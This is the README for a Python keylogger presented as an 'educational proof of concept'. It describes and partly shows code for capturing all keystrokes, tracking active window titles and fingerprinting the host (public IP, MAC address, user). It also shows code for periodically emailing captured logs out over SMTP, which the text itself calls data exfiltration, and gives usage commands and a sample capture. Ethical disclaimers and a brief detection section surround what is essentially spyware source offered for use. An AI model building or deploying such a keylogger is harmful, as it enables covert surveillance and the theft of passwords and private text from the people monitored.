# 👁️ Educational Keylogger Proof of Concept

**⚠️ IMPORTANT ETHICAL WARNING**: This tool is for **EDUCATIONAL PURPOSES ONLY**. 
- Use only on systems you own or have explicit permission to test
- Always disclose monitoring activities to users
- Never use for malicious purposes
- Check local laws regarding keyloggers

## 🎯 Learning Objectives

This proof-of-concept demonstrates:
- Low-level keyboard input monitoring
- Active window title tracking
- System fingerprinting and network information gathering
- Automated reporting via email
- Ethical considerations in security tools

## 🛠️ Features

### 📝 Keystroke Logging
- Captures all keyboard input including special keys
- Distinguishes between character and special key inputs
- Timestamps all keystroke events
- Maintains readable log format

### 🪟 Active Window Tracking
- Monitors currently active window titles
- Logs window changes in the keystroke log
- Provides context for captured keystrokes
- Cross-platform support (Windows enhanced, others basic)

### 🖥️ System Fingerprinting
- **Local Information**: Hostname, OS version, architecture, processor
- **Network Information**: Public IP, local IP, MAC address
- **User Information**: Current user account
- **Session Metadata**: Start time, duration statistics

### 📧 Email Reporting (Optional)
- Periodic email reports with captured data
- Configurable reporting intervals
- Session summary and statistics
- Final report on shutdown

## 📦 Installation

1. Install required dependencies:
```bash
pip install -r requirements.txt
```

2. For enhanced window tracking on Windows:
```bash
pip install pywin32
```

## 🚀 Usage

### Basic Usage
```bash
python keylogger_enhanced.py
```

### With Email Reporting
```bash
python keylogger_enhanced.py --email --interval 15
```

### Help
```bash
python keylogger_enhanced.py --help
```

## ⚙️ Configuration

### Email Setup (Optional)
Edit the `email_config` dictionary in the `main()` function:

```python
email_config = {
    'sender': 'your_email@gmail.com',
    'recipient': 'your_email@gmail.com',
    'smtp_server': 'smtp.gmail.com',
    'smtp_port': 587,
    'use_tls': True,
    'password': 'your_app_password'  # Use app password for Gmail
}
```

**Gmail Setup**: 
1. Enable 2-factor authentication
2. Generate an app password
3. Use the app password in the configuration

## 📊 Output Format

### Log File Structure
```
================================================================================
👁️ EDUCATIONAL KEYLOGGER SESSION STARTED
⏰ Timestamp: 2024-01-15T14:30:25.123456
🖥️ System: macOS-14.0-arm64-arm-64bit
🌐 Public IP: 8.8.8.8
🏠 Local IP: 192.168.1.100
🔗 MAC: 60:3e:5f:3a:c4:4e
👤 User: testuser
================================================================================

🪟 Window: [Untitled - Notepad] at 2024-01-15 14:30:26
Hello World![ENTER]This is a test.[BACKSPACE][BACKSPACE]test.
```

### Email Report Format
```
👁️ Educational Keylogger Report
⏰ Generated: 2024-01-15T14:45:26.123456
🖥️ System: MacBook-Pro.local
🌐 IP: 8.8.8.8

Recent Activity (150 keystrokes):
Hello World!
This is a test of the emergency broadcast system.

---
⚠️ This is an educational monitoring tool
```

## 🔧 Technical Implementation

### Core Components

#### Keystroke Capture
```python
from pynput import keyboard

def _on_key_press(self, key):
    # Process character keys
    if hasattr(key, 'char') and key.char is not None:
        key_data = {'key': key.char, 'key_type': 'char'}
    else:
        # Process special keys (Enter, Shift, etc.)
        key_data = {'key': str(key), 'key_type': 'special'}
```

#### Window Tracking
```python
import win32gui  # Windows enhanced

def _get_active_window(self):
    if platform.system() == "Windows":
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    else:
        return "Window tracking not available"
```

#### System Information
```python
import socket
import platform
import getmac
import requests

def _get_system_info(self):
    return {
        'hostname': socket.gethostname(),
        'platform': platform.platform(),
        'public_ip': requests.get('https://api.ipify.org').json()['ip'],
        'mac_address': getmac.get_mac_address()
    }
```

#### Email Reporting
```python
import smtplib
from email.mime.text import MIMEText

def _send_email_report(self, subject, body):
    msg = MIMEText(body)
    msg['Subject'] = subject
    
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(username, password)
    server.send_message(msg)
```

## 🛡️ Ethical Considerations

### ✅ Acceptable Use Cases
- **Educational Learning**: Understanding input monitoring concepts
- **Personal Security**: Testing your own system defenses
- **Authorized Testing**: With explicit written permission
- **Research**: In controlled academic environments

### ❌ Prohibited Use Cases
- **Unauthorized Monitoring**: Any system without permission
- **Data Theft**: Stealing credentials or personal information
- **Corporate Espionage**: Monitoring company systems
- **Malicious Activities**: Any harmful or illegal purposes

### 📋 Legal Compliance
- **United States**: Varies by state, some require two-party consent
- **Europe**: GDPR requires explicit consent
- **Corporate**: Most countries have workplace monitoring laws
- **Always**: Check local regulations before use

## 🔍 Detection & Prevention

### Antivirus Detection
- Most antivirus software detects keyloggers
- May be flagged as potentially unwanted applications
- Educational tools often have lower detection rates

### System Indicators
- Running processes: `python keylogger_enhanced.py`
- Log files: `keyfile.txt` in current directory
- Network connections: Email SMTP traffic (if enabled)

### Prevention Methods
- Use antivirus software
- Monitor running processes
- Check for unusual network traffic
- Keep systems updated

## 🧪 Testing Scenarios

### Educational Testing
```bash
# Test on your own system
python keylogger_enhanced.py

# Type some test text:
# "Hello World! This is a test [ENTER] [SHIFT]+test"
# Check the keyfile.txt output
```

### Window Tracking Test
```bash
# Start keylogger
python keylogger_enhanced.py

# Switch between different applications
# Observe window changes in the log
```

### Email Reporting Test
```bash
# Configure email settings
python keylogger_enhanced.py --email --interval 1

# Wait for email report (1 minute)
# Check your inbox for the report
```

## 📚 Security Concepts Learned

### Input Monitoring
- How keyboard input is captured at system level
- Difference between character and special keys
- Event-driven programming concepts

### System Enumeration
- Gathering system fingerprinting data
- Network information collection
- Cross-platform compatibility considerations

### Data Exfiltration
- Automated reporting mechanisms
- Email protocols for data transmission
- Timing and frequency considerations

### Ethical Hacking Principles
- Responsible disclosure concepts
- Legal compliance requirements
- Security research ethics

## 🚨 Disclaimer

This tool is provided for **EDUCATIONAL PURPOSES ONLY**. The creators are not responsible for misuse or illegal use of this software. Users are solely responsible for ensuring compliance with applicable laws and regulations.

**Always obtain explicit permission before monitoring any system you do not own.**

---

## 📞 Support

For educational questions or technical support:
- Check the code comments for implementation details
- Review the ethical guidelines before use
- Consult local laws regarding monitoring software

**Remember: With great power comes great responsibility. Use wisely!**
